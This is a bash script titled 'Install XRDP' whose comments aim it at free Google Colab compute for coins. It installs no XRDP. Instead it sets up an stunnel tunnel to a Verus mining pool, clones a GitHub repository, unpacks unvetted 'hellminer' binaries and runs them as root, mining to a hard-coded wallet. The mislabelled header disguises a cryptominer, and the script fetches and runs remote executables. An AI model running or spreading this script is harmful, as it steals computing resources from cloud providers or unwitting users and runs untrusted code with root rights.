#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt install wget build-essential checkinstall
sudo apt install libreadline-gplv2-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev libffi-dev zlib1g-dev
sudo apt install python3 python3-pip build-essential python3-dev
sudo apt-get install stunnel4 -y
sudo apt update
clear
sudo apt install git screen -y
screen -R vrot
cat << EOF > /etc/stunnel/veruspool.conf
pid = /var/run/stunnel4/veruspool.pid
output = /var/log/stunnel4/veruspool.log
[veruspool]
client = yes
accept = 9999
connect = pool.verus.io:19999
EOF
stunnel /etc/stunnel/veruspool.conf
 
git clone https://github.com/burocos/vrots.git
cd vrots
tar xvf vrot.tar.gz
sudo chmod +x hellminer
sudo chmod +x verus-solver 
sudo chmod +x startminer.sh
sudo ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RL5Bce95KspuxP8carp47NU3fBnZ2cpbnT.Rig1 -p x


